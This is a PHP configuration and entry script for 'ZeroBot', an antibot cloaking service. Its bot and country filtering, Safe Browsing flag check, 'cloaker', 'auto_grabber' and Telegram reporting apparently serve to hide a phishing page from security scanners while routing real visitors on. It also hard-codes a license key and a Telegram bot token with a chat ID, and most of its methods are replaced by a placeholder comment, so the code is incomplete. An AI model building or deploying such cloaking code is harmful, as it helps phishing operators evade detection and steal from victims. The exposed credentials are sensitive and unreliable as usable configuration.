<?php
/*
    Antibot Service (ZeroBot)
    * This Tool is not for illegal use
    * All rights reserved to @brendonurie2000
    Platform: https://zerobot.info
    Author: @brendonurie2000
    *** Official Version 5 ***
*/

// ==================== PLATFORM.SH CONFIGURATION ====================
// Configure session handling for Platform.sh
ini_set('session.save_path', '/tmp/sessions');
if (!file_exists('/tmp/sessions')) {
    mkdir('/tmp/sessions', 0777, true);
}
session_start();

// Set error reporting for debugging (remove in production)
error_reporting(E_ALL);
ini_set('display_errors', 1);

// ==================== CONFIGURATION ====================
// Use environment variables for sensitive configuration
$license_key = getenv('LICENSE_KEY') ?: "yba13s816dklaspx8tf03tjcsv1798jk";
$redirect = getenv('REDIRECT_URL') ?: "https://main-bvxea6i-nyfh6jzklm26g.us-3.platformsh.site/";

$parameter = 2; // [REQUIRED] 1: Bots+Countries, 2: Bots only, 3: Countries only, 4: Allow all

$_COUNTRY_ALLOWED = ["ma", "us"]; // Allowed country codes (lowercase)

$redirection_link_check = true;
$check_red_page = true;
$authentification = false;
$cloaker = ["https://aa.com/" => ""];
$auto_grabber = true;
$location_bots = "https://google.com";

// Platform.sh specific paths
$view_file_name = "/app/public/views/views.php"; 

$token_chat = "6707495836:AAEkCDySUwZfju25Og30g90ZHDPHoWSJ5aY";
$chatid = "5811046999";
$captcha = false;
$remove_visitors_duplicate = false;

// Ensure views directory exists
if (!file_exists(dirname($view_file_name))) {
    mkdir(dirname($view_file_name), 0777, true);
}

// ==================== ZEROBOT CLASS ====================
class ZeroBot
{
    // API endpoints
    public $api = "https://zerobot.info/api/v2/antibot";
    public $captcha_api = "https://zerobot.info/api/v2/captcha";
    public $api_geo = "https://zerobot.info/api/v2/getinfo";
    public $telegram = "https://api.telegram.org/bot";
    public $google_api = "https://transparencyreport.google.com/transparencyreport/api/v3/safebrowsing/status?site=";

    // HTML template for views
    public $data_show = '<?php error_reporting(0); session_start(); /* ... rest of your HTML template ... */';

    public function __construct()
    {
        global $captcha, $license_key, $redirect, $parameter, $authentification, 
               $token_chat, $chatid, $view_file_name, $remove_visitors_duplicate, $auto_grabber;
    
        $this->token = $token_chat;
        $this->chatid = $chatid;
        $this->vu_filename = $view_file_name;
        $this->license_key = $license_key;
        $this->useragent = $_SERVER["HTTP_USER_AGENT"] ?? 'Unknown';
        $this->rm_db = $remove_visitors_duplicate;
        $this->data_show = str_replace("BASENAME", basename(__FILE__), $this->data_show);
        $this->redirect = $redirect;
    
        $this->ValidateQuery();
        $this->HtaccessRemover();
        $this->AccessManager();
        $this->IPManager();
        $this->GoogleFlagCheck();
        $this->LinkVerification($license_key);
        $this->GrabberSet($auto_grabber);
        $this->CaptchaRedirection();
    
        $_SESSION['redirect'] = $this->redirect;
    
        if (in_array($parameter, ["1", "2"])) {
            $this->ApiManager($captcha);
            $this->handleCaptchaOrRedirect($captcha);
            $this->ViewsManager("Human");
            header('Location: ' . $this->redirect);
            exit();
        }
        
        if ($parameter == "3") {
            $this->GeolocationManager($license_key);
            $this->CountryManager();
            $this->handleCaptchaOrRedirect($captcha);
            header('Location: ' . $this->redirect);
            exit();
        }

        $this->GeolocationManager($license_key);
        $this->ViewsManager("Allowed");
        $this->handleCaptchaOrRedirect($captcha);
    }

    // [Include all your other methods here exactly as they are in your original code]
    // ValidateQuery(), HtaccessRemover(), AccessManager(), etc.
    // ...

    private function handleCaptchaOrRedirect($captcha)
    {
        if ($captcha) {
            $this->CaptchaResolver();
            exit();
        } else {
            header("Location: " . $this->redirect);
            exit();
        }
    }
}

// ==================== INITIALIZATION ====================
new ZeroBot();
